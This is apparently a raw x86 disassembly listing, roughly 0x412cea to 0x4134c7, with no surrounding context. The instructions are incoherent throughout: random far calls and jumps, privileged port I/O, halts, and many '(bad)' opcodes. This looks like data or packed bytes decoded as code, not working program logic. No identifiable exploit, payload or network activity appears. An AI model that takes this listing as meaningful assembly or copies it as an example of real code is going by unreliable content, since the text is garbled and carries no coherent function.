  412cea:	fiadd  DWORD PTR [edi]
  412cec:	ror    DWORD PTR [esi+0x79],1
  412cef:	or     DWORD PTR [edi-0x61a57836],0x59
  412cf6:	cwde   
  412cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf8:	cwde   
  412cf9:	jae    0x412d3f
  412cfb:	mov    gs,WORD PTR [ecx-0x4008803c]
  412d01:	push   ebp
  412d02:	das    
  412d03:	lahf   
  412d04:	jne    0x412d14
  412d06:	imul   ebx,ebx,0xffffffb9
  412d09:	mov    cl,0x9f
  412d0b:	mov    edi,DWORD PTR [eax+eax*1-0x4d]
  412d0f:	xchg   edi,eax
  412d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d11:	adc    eax,0x522c192a
  412d16:	cmp    edx,DWORD PTR [esi+edi*2+0x895c904]
  412d1d:	adc    eax,0x67984d77
  412d22:	adc    al,0xd3
  412d24:	iret   
  412d25:	fldz   
  412d27:	gs dec eax
  412d29:	stc    
  412d2a:	xchg   edi,eax
  412d2b:	adc    al,0xc5
  412d2d:	inc    edi
  412d2e:	fdivr  QWORD PTR [edi-0x14]
  412d31:	xor    BYTE PTR [esi+0x57],bl
  412d34:	std    
  412d35:	xor    al,0xd2
  412d37:	sbb    eax,0x8e8dd68a
  412d3c:	jnp    0x412d99
  412d3e:	call   0xc5ab:0x37ecc3a7
  412d45:	push   edi
  412d46:	nop
  412d47:	pop    edi
  412d48:	jle    0x412dbf
  412d4a:	pop    ebp
  412d4b:	pop    ebp
  412d4c:	inc    edi
  412d4d:	xor    edi,DWORD PTR [eax]
  412d4f:	loopne 0x412cfd
  412d51:	jecxz  0x412d28
  412d53:	shl    dh,0xa6
  412d56:	arpl   WORD PTR [edi],bx
  412d58:	vhsubpd ymm4,ymm4,YMMWORD PTR [ecx+0xa]
  412d5d:	es cdq 
  412d5f:	out    0x47,eax
  412d61:	in     eax,0xc7
  412d63:	data16 sub dl,bh
  412d66:	loope  0x412da1
  412d68:	ret    0x253d
  412d6b:	test   esp,eax
  412d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6e:	sar    dh,0x72
  412d71:	(bad)  
  412d72:	xor    dh,bl
  412d74:	pusha  
  412d75:	mov    ch,0x35
  412d77:	jae    0x412d6d
  412d79:	or     DWORD PTR [ebx],ebp
  412d7b:	sti    
  412d7c:	jge    0x412d20
  412d7e:	push   ds
  412d7f:	jbe    0x412dbe
  412d81:	or     eax,0xd041c7bd
  412d86:	jbe    0x412d3b
  412d88:	jb     0x412de7
  412d8a:	push   ds
  412d8b:	test   al,0xdc
  412d8d:	dec    ebp
  412d8e:	xchg   ebx,eax
  412d8f:	mulps  xmm7,XMMWORD PTR [eax-0x5a]
  412d93:	lods   al,BYTE PTR ds:[esi]
  412d94:	pop    edx
  412d95:	cmp    cl,cl
  412d97:	mov    ebp,0xe7326e62
  412d9c:	adc    ecx,ebp
  412d9e:	xor    ch,dh
  412da0:	in     al,0xfc
  412da2:	jg     0x412daa
  412da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da5:	aaa    
  412da6:	mov    al,ds:0x675d462e
  412dab:	mov    al,0xe2
  412dad:	mov    ecx,DWORD PTR [edi+ebp*2-0x623b480f]
  412db4:	and    eax,0x17be06dd
  412db9:	push   ecx
  412dba:	(bad)  
  412dbc:	cdq    
  412dbd:	aad    0x97
  412dbf:	(bad)  
  412dc0:	popf   
  412dc1:	push   edx
  412dc2:	dec    ebx
  412dc3:	pop    eax
  412dc4:	add    BYTE PTR [eax+0x1e],ah
  412dc7:	stos   BYTE PTR es:[edi],al
  412dc8:	or     DWORD PTR [ecx+eax*4+0x69ebf32f],eax
  412dcf:	and    eax,0x46b91cf
  412dd4:	jp     0x412dc3
  412dd6:	mov    ds:0x1a54ceba,al
  412ddb:	add    al,BYTE PTR [esi+edi*8-0x6b797c46]
  412de2:	nop
  412de3:	xchg   edi,eax
  412de4:	sbb    eax,0x90040f41
  412de9:	(bad)  
  412dea:	in     eax,0x24
  412dec:	mov    esp,0x7d44b324
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	in     al,dx
  412df3:	cmc    
  412df4:	aas    
  412df5:	stos   DWORD PTR es:[edi],eax
  412df6:	push   cs
  412df7:	sbb    al,0x3
  412df9:	sbb    BYTE PTR [edi],0x53
  412dfc:	sbb    al,0xd
  412dfe:	mov    eax,ds:0x69bfabda
  412e03:	dec    edx
  412e04:	test   DWORD PTR [esp+ebp*8+0x211cdb30],0x7bd0b671
  412e0f:	push   esp
  412e10:	sub    al,0x7a
  412e12:	mov    eax,ds:0x8247cd7a
  412e17:	outs   dx,DWORD PTR ds:[esi]
  412e18:	call   0x49be3804
  412e1d:	mov    dh,BYTE PTR ds:0xa136bb49
  412e23:	stos   DWORD PTR es:[edi],eax
  412e24:	test   BYTE PTR [ecx],ah
  412e26:	pop    edi
  412e27:	jecxz  0x412db3
  412e29:	sub    edi,DWORD PTR [ecx+0x4ff027c4]
  412e2f:	or     ah,BYTE PTR [edx+0x69]
  412e32:	(bad)  
  412e33:	xor    al,0xfa
  412e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e37:	aaa    
  412e38:	pop    eax
  412e39:	mov    al,ds:0x1691445f
  412e3e:	pop    esp
  412e3f:	mov    al,0x9a
  412e41:	jbe    0x412eaf
  412e43:	jle    0x412e2f
  412e45:	or     DWORD PTR [eax],0xffffff9d
  412e48:	xchg   esp,eax
  412e49:	enter  0x2716,0x4b
  412e4d:	bound  edi,QWORD PTR [ebx+0x4a532f97]
  412e53:	xchg   DWORD PTR [ecx+eiz*8+0x33],ebx
  412e57:	push   edx
  412e58:	inc    DWORD PTR [eax+0x61d85b7e]
  412e5e:	inc    edx
  412e5f:	addr16 mov eax,0x34c5a99e
  412e65:	jnp    0x412ded
  412e67:	shl    BYTE PTR [esi],1
  412e69:	repnz sbb cl,BYTE PTR [eax]
  412e6c:	lock imul edi,DWORD PTR [eax-0x75],0xf7b51e24
  412e74:	pop    ebx
  412e75:	(bad)  
  412e76:	adc    eax,0x7b167764
  412e7b:	pop    edx
  412e7c:	stos   BYTE PTR es:[edi],al
  412e7d:	jnp    0x412e26
  412e7f:	cld    
  412e80:	pushf  
  412e81:	les    eax,FWORD PTR ds:0xe256cc27
  412e87:	das    
  412e88:	mov    edi,0x8e0fc9de
  412e8d:	or     bh,dl
  412e8f:	fwait
  412e90:	rcl    esi,0xb
  412e93:	sbb    al,BYTE PTR [edx]
  412e95:	mov    dh,0x59
  412e97:	es dec edx
  412e99:	(bad)  
  412e9a:	dec    edi
  412e9b:	xchg   DWORD PTR [eax],esp
  412e9d:	cli    
  412e9e:	fisttp QWORD PTR [bx+si-0x6d]
  412ea2:	jnp    0x412e7b
  412ea4:	jae    0x412eed
  412ea6:	xor    edx,ebp
  412ea8:	aad    0xc5
  412eaa:	xchg   BYTE PTR [eax-0xc8547d2],bl
  412eb0:	rol    eax,1
  412eb2:	sub    ch,BYTE PTR [ecx+0x29]
  412eb5:	fimul  DWORD PTR [ebp-0x68]
  412eb8:	sub    edx,DWORD PTR [edi+0x3cd9a687]
  412ebe:	add    BYTE PTR [eax+edi*1-0x76],0xa7
  412ec3:	xchg   edi,eax
  412ec4:	icebp  
  412ec5:	or     bl,BYTE PTR [ecx]
  412ec7:	or     esp,DWORD PTR [edx+0x53]
  412eca:	push   ebp
  412ecb:	mov    ebp,0x73827b88
  412ed0:	xor    DWORD PTR [eax+edi*2+0x13],edx
  412ed4:	mov    ecx,0xfc3f0ecb
  412ed9:	cmp    DWORD PTR [ebp+0x49e1aae],ebx
  412edf:	lahf   
  412ee0:	out    0xcb,al
  412ee2:	adc    al,0x92
  412ee4:	data16 lahf 
  412ee6:	adc    eax,0x742f5609
  412eeb:	mov    esi,0xb3e62838
  412ef0:	faddp  st(0),st
  412ef2:	js     0x412f2d
  412ef4:	mov    eax,0x95aaffe6
  412ef9:	fistp  WORD PTR [eax+0x7d]
  412efc:	mov    cl,0x12
  412efe:	add    ebp,DWORD PTR [esi]
  412f00:	mov    cl,0xa2
  412f02:	inc    ecx
  412f03:	(bad)  
  412f04:	sub    al,0xa9
  412f06:	arpl   WORD PTR [edi-0x45b73b03],si
  412f0c:	adc    bl,BYTE PTR [edx-0x27]
  412f0f:	xor    dh,BYTE PTR [esi+eiz*2-0x51]
  412f13:	cmp    edx,DWORD PTR [ecx+0x67aa7f2]
  412f19:	sahf   
  412f1a:	mov    esp,0x6a452ed0
  412f1f:	and    dl,ch
  412f21:	lock push DWORD PTR [ebx+0x6d]
  412f25:	out    dx,al
  412f26:	int    0xc6
  412f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f29:	adc    ch,BYTE PTR [edx+0x10]
  412f2c:	mov    eax,ds:0x12cd8522
  412f31:	imul   esp,DWORD PTR [edi-0x5f],0xb1102e35
  412f38:	sar    BYTE PTR [ecx-0x56573d2f],0x51
  412f3f:	ds repz shl edi,1
  412f43:	cld    
  412f44:	ficomp DWORD PTR [esi+0x7baacc2e]
  412f4a:	shl    edx,0x59
  412f4d:	cmp    cl,BYTE PTR [ecx]
  412f4f:	xor    al,0xed
  412f51:	addr16 cmp al,0xf
  412f54:	iret   
  412f55:	imul   ecx,DWORD PTR [edx],0xf1e28fcd
  412f5b:	sbb    cl,BYTE PTR [edx]
  412f5d:	out    dx,eax
  412f5e:	leave  
  412f5f:	lods   al,BYTE PTR ds:[esi]
  412f60:	mov    WORD PTR ds:0x425c9712,ds
  412f66:	pop    ds
  412f67:	jmp    0x35dc:0x3bf0e60e
  412f6e:	cmp    esi,DWORD PTR [esi-0x7e]
  412f71:	and    eax,0x7e8198d0
  412f76:	jae    0x412efe
  412f78:	sub    eax,0xb051ac25
  412f7d:	mov    bl,0x3
  412f7f:	bound  esi,QWORD PTR [ecx-0x3b]
  412f82:	xchg   esp,eax
  412f83:	jl     0x412f55
  412f85:	popf   
  412f86:	(bad)  
  412f87:	int    0x50
  412f89:	repnz rol DWORD PTR [edi-0x17],cl
  412f8d:	cld    
  412f8e:	xor    eax,0x12772c26
  412f93:	mov    ds:0xc9944f7f,al
  412f98:	xor    ecx,esp
  412f9a:	icebp  
  412f9b:	(bad)  
  412f9c:	aas    
  412f9d:	sub    BYTE PTR [ebp-0xc38607a],dh
  412fa3:	call   0x531344d2
  412fa8:	pop    es
  412fa9:	fiadd  DWORD PTR [edi]
  412fab:	push   ss
  412fac:	sbb    BYTE PTR [edi+0x1c],ah
  412faf:	mov    ds:0x7af84329,al
  412fb4:	in     al,0xf9
  412fb6:	jb     0x412fba
  412fb8:	rcl    bl,0xa2
  412fbb:	(bad)  
  412fbc:	jp     0x412f56
  412fbe:	ret    
  412fbf:	xor    BYTE PTR [esi+0x53],cl
  412fc2:	sub    BYTE PTR [ebx],ch
  412fc4:	jno    0x412ff6
  412fc6:	nop
  412fc7:	shl    DWORD PTR [edx+0x56],cl
  412fca:	mov    cl,0x5e
  412fcc:	std    
  412fcd:	addr16 xchg bx,ax
  412fd0:	push   es
  412fd1:	test   DWORD PTR [edi-0x44afab56],eax
  412fd7:	gs into 
  412fd9:	push   esp
  412fda:	mov    al,ds:0x64182c9b
  412fdf:	jae    0x412fb1
  412fe1:	mov    BYTE PTR [ebx],bl
  412fe3:	mov    ch,0x8b
  412fe5:	test   al,0xa3
  412fe7:	push   esi
  412fe8:	jp     0x412fa8
  412fea:	mov    edx,0xe939a6a3
  412fef:	(bad)  
  412ff0:	sti    
  412ff1:	inc    eax
  412ff2:	das    
  412ff3:	or     eax,0xb788a675
  412ff8:	test   DWORD PTR [esi+0x3c],esp
  412ffb:	scas   al,BYTE PTR es:[edi]
  412ffc:	cdq    
  412ffd:	aas    
  412ffe:	sbb    eax,0x8f44e90c
  413003:	call   0x20ea9297
  413008:	jae    0x413041
  41300a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41300b:	sbb    edx,DWORD PTR [eax]
  41300d:	add    DWORD PTR [esi-0x6d],edx
  413010:	adc    BYTE PTR [ebp+0x56],ah
  413013:	not    DWORD PTR [ecx]
  413015:	ret    0x3158
  413018:	sbb    al,0x67
  41301a:	fnstenv [ecx-0x74813ee]
  413020:	in     al,dx
  413021:	lds    edx,FWORD PTR [edx+0x573c545e]
  413027:	mov    ch,0x6b
  413029:	mov    bl,0x70
  41302b:	inc    ecx
  41302c:	clc    
  41302d:	add    ch,BYTE PTR [esp+edi*1]
  413030:	test   DWORD PTR [edx+eax*4+0x774aee64],0x9165dfb1
  41303b:	jbe    0x41305f
  41303d:	in     eax,dx
  41303e:	outs   dx,DWORD PTR ds:[esi]
  41303f:	mov    ds:0xffd917a,eax
  413044:	xor    esi,DWORD PTR [ebx+0x54]
  413047:	call   0xcd3b:0x1a5c5135
  41304e:	ror    DWORD PTR [eax-0x77],1
  413051:	pop    edi
  413052:	lock sbb esi,DWORD PTR [ebp-0x78]
  413056:	xlat   BYTE PTR ds:[ebx]
  413057:	push   ds
  413058:	ss aad 0x9e
  41305b:	sahf   
  41305c:	sbb    eax,0x8b61d370
  413061:	mov    es,WORD PTR [ecx+0x1e]
  413064:	sub    dh,BYTE PTR [ecx]
  413066:	and    ecx,DWORD PTR [eax]
  413068:	add    BYTE PTR ds:0x174835a,0x6c
  41306f:	or     BYTE PTR [edi+0x7],ah
  413072:	jcxz   0x413030
  413075:	xchg   edx,eax
  413076:	adc    eax,0x3b74518d
  41307b:	cmp    DWORD PTR [edx],edi
  41307d:	icebp  
  41307e:	lahf   
  41307f:	lods   al,BYTE PTR ds:[esi]
  413080:	fist   DWORD PTR [ebx-0x1d]
  413083:	push   eax
  413084:	retf   
  413085:	mov    DWORD PTR [eax-0x7d208d5d],ebx
  41308b:	in     al,dx
  41308c:	test   ebp,0xd096345e
  413092:	adc    eax,0x492f436f
  413097:	test   al,0x66
  413099:	add    cl,ch
  41309b:	push   ecx
  41309c:	add    eax,0xf4c98888
  4130a1:	(bad)  
  4130a2:	loop   0x413028
  4130a4:	adc    DWORD PTR [ebx+0x8],ebp
  4130a7:	add    al,0xa6
  4130a9:	add    ebp,DWORD PTR [ebx-0x6]
  4130ac:	in     al,dx
  4130ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ae:	fsubp  st(7),st
  4130b0:	call   0x2f650fb
  4130b5:	add    al,0x59
  4130b7:	call   0x306a:0x6aeaa771
  4130be:	sub    bl,BYTE PTR ss:[esi+eax*1-0x70735348]
  4130c6:	inc    esp
  4130c7:	jmp    0xf90143b5
  4130cc:	mov    bh,0x26
  4130ce:	jo     0x413109
  4130d0:	or     eax,0x4e582192
  4130d5:	ins    BYTE PTR es:[edi],dx
  4130d6:	not    bl
  4130d8:	dec    esp
  4130d9:	retf   
  4130da:	mov    BYTE PTR [eax],cl
  4130dc:	mov    ebp,esi
  4130de:	pop    edi
  4130df:	mov    DWORD PTR [edi],0xc1813189
  4130e5:	pop    eax
  4130e6:	(bad)  
  4130e7:	cmp    al,0xd0
  4130e9:	and    eax,0x35ee0436
  4130ee:	adc    ch,al
  4130f0:	fbstp  TBYTE PTR [esi-0xaf3e874]
  4130f6:	mov    bl,0x86
  4130f8:	mov    ss,WORD PTR [ebp-0x22ad00ea]
  4130fe:	aam    0x78
  413100:	mov    WORD PTR [esi+edi*8+0x193147d2],?
  413107:	div    ecx
  413109:	aaa    
  41310a:	jns    0x4130f0
  41310c:	out    dx,eax
  41310d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41310e:	mov    eax,0x4083d29c
  413113:	mov    DWORD PTR [ebx-0x54a89d87],ebx
  413119:	cmp    eax,edi
  41311b:	pop    eax
  41311c:	inc    esp
  41311d:	mov    ch,0x91
  41311f:	mov    ah,0xec
  413121:	mov    ecx,0xb3a7ce86
  413126:	pusha  
  413127:	aam    0xca
  413129:	sbb    al,0xd8
  41312b:	jecxz  0x41318a
  41312d:	sbb    DWORD PTR [ebx-0x480a5150],ebx
  413133:	into   
  413134:	mov    esp,0x19305e2
  413139:	pusha  
  41313a:	test   BYTE PTR [edx+0x64],ah
  41313d:	icebp  
  41313e:	inc    ebx
  41313f:	or     DWORD PTR [esi+0x28],0xf
  413143:	ret    
  413144:	cdq    
  413145:	mov    BYTE PTR [ecx-0x2ad0e294],cl
  41314b:	push   ds
  41314c:	into   
  41314d:	int3   
  41314e:	inc    eax
  41314f:	mov    ebx,0xcfe1bcd3
  413154:	adc    ah,dl
  413156:	cmp    al,0x24
  413158:	sar    DWORD PTR [bp+di],1
  41315b:	mov    bl,BYTE PTR [ecx-0x6f]
  41315e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41315f:	das    
  413160:	and    eax,0xe7870f73
  413165:	shr    BYTE PTR [edx+0x5b9e589e],0x82
  41316c:	dec    esp
  41316d:	pushf  
  41316e:	and    eax,0x6da75d19
  413173:	pop    eax
  413174:	mov    ds:0x12490636,eax
  413179:	(bad)  
  41317a:	in     eax,dx
  41317b:	xchg   al,cl
  41317d:	in     al,0x86
  41317f:	jne    0x41313f
  413181:	outs   dx,DWORD PTR ds:[esi]
  413182:	js     0x4131a5
  413184:	hlt    
  413185:	jae    0x4131f5
  413187:	pop    es
  413188:	mov    bh,0x65
  41318a:	xchg   ecx,eax
  41318b:	sbb    BYTE PTR [ecx],bh
  41318d:	mov    esi,0xc15abf81
  413192:	mov    al,ds:0xe3834081
  413197:	pop    esp
  413198:	in     eax,dx
  413199:	popa   
  41319a:	dec    edi
  41319b:	ja     0x4131f1
  41319d:	jae    0x41314b
  41319f:	add    BYTE PTR [ebx-0xe],dl
  4131a2:	aam    0xb2
  4131a4:	adc    DWORD PTR [ebx],ecx
  4131a6:	mov    ds:0xbfd58289,eax
  4131ab:	sahf   
  4131ac:	cmp    ecx,esp
  4131ae:	push   edi
  4131af:	push   ds
  4131b0:	sub    BYTE PTR [ebx+eiz*4-0x2],dl
  4131b4:	or     eax,0xed212125
  4131b9:	mov    edi,0x2c3e5491
  4131be:	data16 std 
  4131c0:	adc    BYTE PTR [edx+0x2ef00d55],bl
  4131c6:	xchg   bl,ch
  4131c8:	adc    al,0x46
  4131ca:	sub    DWORD PTR [ecx-0x9f326c2],esi
  4131d0:	sub    BYTE PTR [ebx-0x63],0xdf
  4131d4:	repnz cmp eax,0xfaf811f5
  4131da:	jno    0x413165
  4131dc:	inc    edx
  4131dd:	out    dx,al
  4131de:	cwde   
  4131df:	mov    DWORD PTR [eax-0x3b],ecx
  4131e2:	in     eax,dx
  4131e3:	push   ebx
  4131e4:	adc    al,BYTE PTR [ebx+0x71]
  4131e7:	div    DWORD PTR [ecx+0x30c55cb3]
  4131ed:	test   BYTE PTR [ecx-0xf],al
  4131f0:	xchg   esi,eax
  4131f1:	cmp    eax,0xdb05cb9c
  4131f6:	pop    esp
  4131f7:	hlt    
  4131f8:	mov    ebp,0x8b3afa59
  4131fd:	push   edi
  4131fe:	mov    ebp,0x5c611105
  413203:	out    0x2c,al
  413205:	xchg   ecx,eax
  413206:	mov    BYTE PTR [edx],bh
  413208:	mov    ?,WORD PTR [ecx+0x3284dafe]
  41320e:	lock dec edi
  413210:	aad    0x99
  413212:	pop    eax
  413213:	mov    esp,0x333d09c4
  413218:	mov    cl,0x12
  41321a:	es jb  0x4131f9
  41321d:	pop    ecx
  41321e:	mov    eax,cs
  413220:	sbb    DWORD PTR [edi-0x10],0x5f438c76
  413227:	xor    ah,dl
  413229:	pmaxub mm6,QWORD PTR [eax+0x28]
  41322d:	mov    ds:0x2d23f351,eax
  413232:	out    0xb8,al
  413234:	ret    
  413235:	cli    
  413236:	leave  
  413237:	lods   al,BYTE PTR ds:[esi]
  413238:	pop    ecx
  413239:	sbb    al,0x25
  41323b:	daa    
  41323c:	dec    eax
  41323d:	out    0xc6,eax
  41323f:	inc    ebx
  413240:	jnp    0x41328e
  413242:	leave  
  413243:	int3   
  413244:	sbb    DWORD PTR [esi],edi
  413246:	stos   DWORD PTR es:[edi],eax
  413247:	fdivr  st(2),st
  413249:	push   ds
  41324a:	jmp    0xa929:0x78a5ef3a
  413251:	cmc    
  413252:	ds push cs
  413254:	repnz pop eax
  413256:	pop    ecx
  413257:	retf   0x85ce
  41325a:	pop    eax
  41325b:	ins    BYTE PTR es:[edi],dx
  41325c:	lods   eax,DWORD PTR ds:[esi]
  41325d:	xlat   BYTE PTR ds:[ebx]
  41325e:	mov    al,ds:0x3f8cd792
  413263:	jecxz  0x4132d4
  413265:	push   esi
  413266:	arpl   WORD PTR [ecx+0x2f],cx
  413269:	enter  0x28ce,0x3d
  41326d:	nop
  41326e:	mov    ebp,0xdbc3fdee
  413273:	lahf   
  413274:	add    eax,0xf1367c51
  413279:	and    DWORD PTR [ecx-0x5613f698],ebx
  41327f:	or     al,0xbd
  413281:	(bad)  
  413282:	and    BYTE PTR [edi+0x7d16d5b8],al
  413288:	loop   0x413213
  41328a:	sahf   
  41328b:	sbb    dh,BYTE PTR [edi-0x69]
  41328e:	adc    DWORD PTR [eax],esi
  413290:	jns    0x413254
  413292:	data16 fcmovnbe st,st(1)
  413295:	in     eax,0x55
  413297:	sbb    BYTE PTR [ebx],ch
  413299:	shl    DWORD PTR [ebx],1
  41329b:	jp     0x4132d9
  41329d:	push   ss
  41329e:	cwde   
  41329f:	adc    DWORD PTR [ecx],edx
  4132a1:	mov    ebp,0xabafcba8
  4132a6:	and    esp,DWORD PTR [edi-0x71]
  4132a9:	push   esp
  4132aa:	mov    ah,0x73
  4132ac:	je     0x413266
  4132ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132af:	push   edi
  4132b0:	mov    ds:0xc5cfe554,eax
  4132b5:	in     al,dx
  4132b6:	adc    ebx,DWORD PTR [ebx]
  4132b8:	jnp    0x413267
  4132ba:	das    
  4132bb:	mov    ecx,0xd6ca76af
  4132c0:	inc    ecx
  4132c1:	adc    al,0x11
  4132c3:	dec    ebx
  4132c4:	mov    bh,0xf1
  4132c6:	mov    al,ds:0x4bec7185
  4132cb:	cld    
  4132cc:	mov    eax,ds:0x8e05f890
  4132d1:	adc    al,0x9d
  4132d3:	mov    ch,0x42
  4132d5:	fdiv   QWORD PTR [eax]
  4132d7:	sub    cl,BYTE PTR [ebp-0x4e]
  4132da:	popf   
  4132db:	out    dx,al
  4132dc:	push   ebp
  4132dd:	push   es
  4132de:	adc    DWORD PTR [edi],esp
  4132e0:	fwait
  4132e1:	jbe    0x41327b
  4132e3:	repnz or dl,dl
  4132e6:	inc    ecx
  4132e7:	int3   
  4132e8:	in     eax,0x1d
  4132ea:	enter  0xf927,0x40
  4132ee:	mov    ecx,0x43da91cc
  4132f3:	pushf  
  4132f4:	(bad)  
  4132f5:	pushf  
  4132f6:	cmp    ebp,DWORD PTR [esi]
  4132f8:	loopne 0x413317
  4132fa:	push   DWORD PTR [esi-0x27]
  4132fd:	dec    esi
  4132fe:	jge    0x413323
  413300:	mov    al,0xe8
  413302:	loope  0x413294
  413304:	mov    esp,0x5d0bb679
  413309:	cs mov ebp,0x13d09466
  41330f:	cwde   
  413310:	or     BYTE PTR [esi+0x6e6c68b1],al
  413316:	push   edi
  413317:	and    DWORD PTR [edi-0x39f16a05],esp
  41331d:	shl    ah,1
  41331f:	sbb    edx,DWORD PTR [esi]
  413321:	int    0xe8
  413323:	lods   eax,DWORD PTR ds:[esi]
  413324:	mov    esi,0x6fa2dca7
  413329:	push   eax
  41332a:	pop    eax
  41332b:	lods   al,BYTE PTR ds:[esi]
  41332c:	jns    0x4132c8
  41332e:	mov    dl,0xc1
  413330:	(bad)
  413333:	arpl   WORD PTR [ebx-0x24],bx
  413336:	repz dec ebx
  413338:	mov    al,0xda
  41333a:	sbb    edx,DWORD PTR [edi]
  41333c:	jp     0x4132e3
  41333e:	mov    ebp,0xe98d1622
  413343:	push   ebp
  413344:	add    BYTE PTR [eax+0x5bce5620],ch
  41334a:	loop   0x413334
  41334c:	(bad)  
  41334d:	lods   eax,DWORD PTR ds:[esi]
  41334e:	cli    
  41334f:	push   ecx
  413350:	adc    DWORD PTR [edx-0x18f5545f],0x27815f85
  41335a:	dec    eax
  41335b:	fsub   QWORD PTR [bp+si-0x58f8]
  413360:	jecxz  0x413386
  413362:	jmp    0x8fbed0a8
  413367:	nop
  413368:	test   BYTE PTR [esi+0x4a0b0fd8],al
  41336e:	mov    ebp,0xccfa44fc
  413373:	ds sbb bh,al
  413376:	and    BYTE PTR [esi],al
  413378:	mov    dh,0xd0
  41337a:	sbb    DWORD PTR [esi-0x67160cc4],0x66
  413381:	sahf   
  413382:	repz adc eax,0xc54b97a1
  413388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413389:	xchg   BYTE PTR [ebx+ecx*1],ch
  41338c:	rcl    DWORD PTR [eax],1
  41338e:	mov    edx,0xfc09ad0a
  413393:	fcomp  QWORD PTR [ebp+0x2d4118fa]
  413399:	mov    ch,0xa3
  41339b:	das    
  41339c:	pop    edi
  41339d:	dec    eax
  41339e:	xchg   ebx,eax
  41339f:	inc    esp
  4133a0:	js     0x4133d4
  4133a2:	jmp    0x8edaada6
  4133a7:	fstp   TBYTE PTR [eax-0x79]
  4133aa:	ds enter 0x7780,0xfe
  4133af:	add    ebp,esi
  4133b1:	loope  0x4133f0
  4133b3:	daa    
  4133b4:	push   cs
  4133b5:	test   BYTE PTR [edx],dl
  4133b7:	popa   
  4133b8:	aad    0x96
  4133ba:	das    
  4133bb:	mov    ecx,0xece972ee
  4133c0:	dec    ecx
  4133c1:	xor    cl,dl
  4133c3:	mov    DWORD PTR [esi-0x5],eax
  4133c6:	inc    ecx
  4133c7:	(bad)  
  4133c8:	fadd   DWORD PTR [ebx+eiz*8+0x5b405a90]
  4133cf:	add    DWORD PTR [eax+esi*8-0x6c901273],0x5691f16d
  4133da:	sti    
  4133db:	inc    bh
  4133dd:	ret    
  4133de:	ins    DWORD PTR es:[edi],dx
  4133df:	retf   
  4133e0:	out    0x1b,al
  4133e2:	inc    edx
  4133e3:	sub    eax,0x25bb5e8d
  4133e8:	sti    
  4133e9:	ins    BYTE PTR es:[edi],dx
  4133ea:	inc    esp
  4133eb:	int    0x5e
  4133ed:	jle    0x413426
  4133ef:	xor    esi,DWORD PTR ds:0x7eee8503
  4133f5:	jmp    0xe9abb01b
  4133fa:	xchg   ecx,eax
  4133fb:	xchg   ebx,esp
  4133fd:	cmc    
  4133fe:	or     ebx,DWORD PTR ds:0xa3a70742
  413404:	outs   dx,DWORD PTR ds:[esi]
  413405:	rol    DWORD PTR [edi-0x3e],1
  413408:	shl    BYTE PTR [ebp+0x1996e47e],cl
  41340e:	test   eax,0xed1798a1
  413413:	fstp   DWORD PTR [ebp+0x48]
  413416:	inc    eax
  413417:	xor    DWORD PTR [ebp+0x12],ecx
  41341a:	jp     0x4133e7
  41341c:	mov    bh,0xd7
  41341e:	inc    edx
  41341f:	jnp    0x41340f
  413421:	add    eax,0xcebde265
  413426:	add    BYTE PTR [ecx+0x3a10d3f0],al
  41342c:	push   0xffffff9c
  41342e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342f:	lahf   
  413430:	cmp    edx,DWORD PTR [eax-0x58]
  413433:	inc    ebp
  413434:	int3   
  413435:	jae    0x413460
  413437:	xor    DWORD PTR [ebp-0x7a0c9c62],0x47
  41343e:	xchg   edx,eax
  41343f:	push   eax
  413440:	mov    cs,WORD PTR [edx]
  413442:	mov    esp,0xf94103bc
  413447:	test   al,0x46
  413449:	jb     0x4133f6
  41344b:	cdq    
  41344c:	in     eax,0xd
  41344e:	cwde   
  41344f:	nop
  413450:	out    0x63,al
  413452:	pop    ebp
  413453:	and    al,0xf0
  413455:	aad    0xc3
  413457:	jbe    0x41345d
  413459:	(bad)  
  41345a:	lods   al,BYTE PTR ds:[esi]
  41345b:	mov    ebp,DWORD PTR [ecx-0x39]
  41345e:	clc    
  41345f:	xor    bl,BYTE PTR [eax+edx*4-0x73]
  413463:	(bad)  
  413464:	ins    BYTE PTR es:[edi],dx
  413465:	pop    ss
  413466:	xor    BYTE PTR [eax],bl
  413468:	push   cs
  413469:	int3   
  41346a:	imul   eax,DWORD PTR [edi-0xf],0xb26d4aad
  413471:	cmp    BYTE PTR [ebp+0x68],al
  413474:	scas   eax,DWORD PTR es:[edi]
  413475:	mov    ds:0xa6f2c172,al
  41347a:	mov    dl,0xdc
  41347c:	stc    
  41347d:	or     ebx,ebx
  41347f:	or     al,0x7b
  413481:	xchg   edx,eax
  413482:	pop    es
  413483:	push   ebx
  413484:	pop    ss
  413485:	and    DWORD PTR [di],ebp
  413488:	pop    eax
  413489:	(bad)  
  41348a:	cld    
  41348b:	xchg   esi,eax
  41348c:	lods   al,BYTE PTR ds:[esi]
  41348d:	ficom  DWORD PTR [edx-0x3da9d1b8]
  413493:	retf   
  413494:	cmp    al,BYTE PTR [ebp-0x30044217]
  41349a:	pushf  
  41349b:	jnp    0x413455
  41349d:	mov    esi,0x1d9498d0
  4134a2:	push   ss
  4134a3:	sbb    ah,bh
  4134a5:	cmp    al,0xf5
  4134a7:	loop   0x4134d8
  4134a9:	mov    ch,0x9d
  4134ab:	jns    0x413440
  4134ad:	fstp   DWORD PTR [ebp+0x4e]
  4134b0:	mov    edx,0xbbc36818
  4134b5:	test   al,0x7c
  4134b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134b8:	add    DWORD PTR [eax-0x41],0x62
  4134bc:	ja     0x4134d6
  4134be:	dec    esp
  4134bf:	cmp    ch,BYTE PTR [ebp+0x5bc19b85]
  4134c5:	add    DWORD PTR [edx],ecx
  4134c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
